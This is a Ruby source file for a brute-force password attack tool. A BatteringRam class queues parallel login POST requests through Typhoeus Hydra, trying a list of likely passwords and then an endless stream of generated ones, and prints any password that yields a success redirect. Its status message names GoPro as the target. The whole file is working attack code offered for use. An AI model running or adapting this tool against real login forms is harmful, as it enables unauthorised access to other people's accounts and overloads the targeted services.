require 'typhoeus'
require 'gentle_brute'

class BatteringRam
	# ToDo: Allow users to specify specific form fields to be passed

	attr_accessor :brute, :hydra, :url, :options, :url_options,
								:min_password_length, :potential_logins, :likely_passwords,
								:success_match

	def initialize(url, potential_logins, success_match, options)
		@url = url
		@options = options
		@url_options = @options[:url_options] || {method: :post, followlocation: true}
		@likely_passwords = @options[:likely_passwords] || []
		@min_password_length = @options[:min_password_length] || 6
		@potential_logins = potential_logins
		@success_match = success_match
		@brute = GentleBrute::BruteForcer.new(@min_password_length)
		@hydra = Typhoeus::Hydra.new
	end

	def new_login_request(login, password)
		request_options = @url_options.merge(body: { user: {login: login, password: password} })
		request = Typhoeus::Request.new(@url, request_options)
		request.on_complete do |response|
			if response.redirections.any? {|r| r.options[:response_headers].match(@success_match) }
				puts("\nThe password for #{login} is [#{password}]!")
			else
				print(".")
			end
		end
		return request
	end

	def try_likely_passwords
		@potential_logins.each do |login|
			@likely_passwords.each do |password|
				@hydra.queue new_login_request(login, password)
			end
		end
		puts("Starting Brute Force password attack on GoPro using #{potential_logins.count} potential logins.")
		@hydra.run
	end

	def run
		try_likely_passwords

		while true
		  password = @brute.next_valid_phrase
			@potential_logins.each do |login|
				@hydra.queue new_login_request(login, password)
			end
			@hydra.run
		end
	end
end